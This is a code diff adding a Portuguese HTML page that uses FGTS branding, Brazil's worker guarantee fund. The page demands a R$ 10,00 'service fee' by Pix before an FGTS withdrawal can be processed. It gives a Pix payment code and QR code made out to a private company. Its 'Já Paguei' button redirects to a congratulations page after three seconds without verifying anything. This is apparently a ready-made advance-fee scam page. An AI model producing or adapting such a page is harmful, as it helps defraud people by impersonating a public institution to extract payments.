@@ -1,0 +1,126 @@
+
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pagamento - FGTS</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #005f9e; /* Fundo azul */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: white;
+            width: 450px; /* Aumenta o tamanho do card */
+            padding: 30px; /* Aumenta o espaçamento interno */
+            border-radius: 15px; /* Bordas mais arredondadas */
+            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        .logo {
+            width: 150px;
+            margin-bottom: 30px;
+        }
+        .qrcode {
+            width: 200px;
+            height: 200px;
+            margin-bottom: 20px;
+        }
+        .pix {
+            font-size: 24px; /* Tamanho maior */
+            font-weight: bold;
+            margin-bottom: 15px;
+            color: green; /* Números em verde */
+        }
+        .taxa-servico {
+            font-size: 18px; /* Aumenta o tamanho do texto */
+            color: red;
+            margin-bottom: 20px;
+        }
+        .copy-container {
+            background-color: #f9f9f9;
+            padding: 15px; /* Aumenta o espaçamento interno */
+            border-radius: 10px;
+            margin-bottom: 20px;
+            position: relative;
+        }
+        .copy-container input {
+            border: none;
+            width: 100%;
+            font-size: 18px; /* Aumenta o tamanho da fonte */
+            text-align: center;
+            background-color: transparent;
+            color: #333;
+        }
+        .copy-button {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            background-color: #ffcc00;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            padding: 5px 10px;
+            cursor: pointer;
+        }
+        button {
+            width: 100%;
+            padding: 15px; /* Aumenta o tamanho do botão */
+            background-color: #ffcc00;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 18px; /* Aumenta o tamanho da fonte */
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #cca300;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="fgts.jpg" alt="FGTS" class="logo">
+        <h2>Faça o pagamento para prosseguir</h2>
+        
+        <div class="qrcode">
+            <img src="qrcode.jpg" alt="QR Code para pagamento" width="200" height="200">
+        </div>
+        
+        <div class="pix">Chave Pix:</div>
+        <div class="copy-container">
+            <input type="text" id="pixKey" value="00020126360014br.gov.bcb.pix0114113510860001135204000053039865802BR5921MB PAY PAGAMENTO LTDA6009SAO PAULO62070503***63049276" readonly>
+            <button class="copy-button" onclick="copyPix()">Copiar</button>
+        </div>
+
+        <div class="taxa-servico">Taxa de serviço: R$ 10,00</div>
+        
+        <p>Este valor é necessário para a corretora processar o saque e simulação.</p>
+        
+        <button onclick="prosseguir()">Já Paguei</button>
+    </div>
+
+    <script>
+        function copyPix() {
+            const pixInput = document.getElementById("pixKey");
+            pixInput.select();
+            pixInput.setSelectionRange(0, 99999); // Para dispositivos móveis
+            document.execCommand("copy");
+            alert("Chave Pix copiada!");
+        }
+
+        function prosseguir() {
+            setTimeout(() => {
+                window.location.href = 'parabens.html';
+            }, 3000);
+        }
+    </script>
+</body>
+</html>
